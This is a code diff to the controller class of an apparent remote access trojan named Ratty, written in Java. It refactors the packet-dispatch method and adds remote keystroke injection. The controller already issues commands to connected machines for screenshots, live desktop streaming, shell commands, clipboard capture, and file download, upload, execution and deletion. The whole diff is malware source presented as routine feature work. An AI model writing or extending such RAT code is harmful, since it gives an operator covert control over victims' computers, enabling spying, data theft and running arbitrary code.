@@ -11,6 +11,7 @@ import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
+import de.sogomn.rat.packet.CreateFolderPacket;
 import de.sogomn.rat.packet.DeleteFilePacket;
 import de.sogomn.rat.packet.DesktopStreamPacket;
 import de.sogomn.rat.packet.DownloadFilePacket;
@@ -19,7 +20,7 @@ import de.sogomn.rat.packet.FileSystemPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
-import de.sogomn.rat.packet.CreateFolderPacket;
+import de.sogomn.rat.packet.KeyEventPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.packet.UploadFilePacket;
@@ -70,32 +71,32 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient serverClient) {
+		IPacket packet = null;
+		
 		if (command == RattyGui.POPUP) {
-			return PopupPacket.create();
+			packet = PopupPacket.create();
 		} else if (command == RattyGui.FREE) {
-			return new FreePacket();
+			packet = new FreePacket();
 		} else if (command == RattyGui.SCREENSHOT) {
-			return new ScreenshotPacket();
+			packet = new ScreenshotPacket();
 		} else if (command == RattyGui.COMMAND) {
-			return CommandPacket.create();
+			packet = CommandPacket.create();
 		} else if (command == RattyGui.DESKTOP) {
-			return new DesktopStreamPacket(true);
+			packet = new DesktopStreamPacket(true);
 		} else if (command == RattyGui.CLIPBOARD) {
-			return new ClipboardPacket();
+			packet = new ClipboardPacket();
 		} else if (command == FileTreePanel.REQUEST) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastPathClicked();
-			final FileSystemPacket packet = new FileSystemPacket(path);
+			
+			packet = new FileSystemPacket(path);
 			
 			treePanel.removeChildren(path);
-			
-			return packet;
 		} else if (command == FileTreePanel.DOWNLOAD) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastPathClicked();
-			final DownloadFilePacket packet = new DownloadFilePacket(path);
 			
-			return packet;
+			packet = new DownloadFilePacket(path);
 		} else if (command == FileTreePanel.UPLOAD) {
 			final File file = chooseFile();
 			
@@ -103,37 +104,42 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 				final String localPath = file.getAbsolutePath();
 				final FileTreePanel treePanel = serverClient.getTreePanel();
 				final String path = treePanel.getLastNodePathFolder();
-				final UploadFilePacket packet = new UploadFilePacket(localPath, path);
 				
-				return packet;
+				packet = new UploadFilePacket(localPath, path);
 			}
 		} else if (command == FileTreePanel.EXECUTE) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastPathClicked();
-			final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 			
-			return packet;
+			packet = new ExecuteFilePacket(path);
 		} else if (command == FileTreePanel.NEW_FOLDER) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastNodePathFolder();
 			final String name = JOptionPane.showInputDialog(null);
 			
 			if (name != null && !name.isEmpty()) {
-				final CreateFolderPacket packet = new CreateFolderPacket(path, name);
-				
-				return packet;
+				packet = new CreateFolderPacket(path, name);
 			}
 		} else if (command == FileTreePanel.DELETE) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastPathClicked();
-			final DeleteFilePacket packet = new DeleteFilePacket(path);
+			
+			packet = new DeleteFilePacket(path);
 			
 			treePanel.removeFile(path);
+		} else if (command == DisplayPanel.KEY_PRESSED) {
+			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
+			final int key = displayPanel.getLastKeyHit();
 			
-			return packet;
+			packet = new KeyEventPacket(key, KeyEventPacket.PRESS);
+		} else if (command == DisplayPanel.KEY_RELEASED) {
+			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
+			final int key = displayPanel.getLastKeyHit();
+			
+			packet = new KeyEventPacket(key, KeyEventPacket.RELEASE);
 		}
 		
-		return null;
+		return packet;
 	}
 	
 	private void handle(final ServerClient serverClient, final ScreenshotPacket packet) {
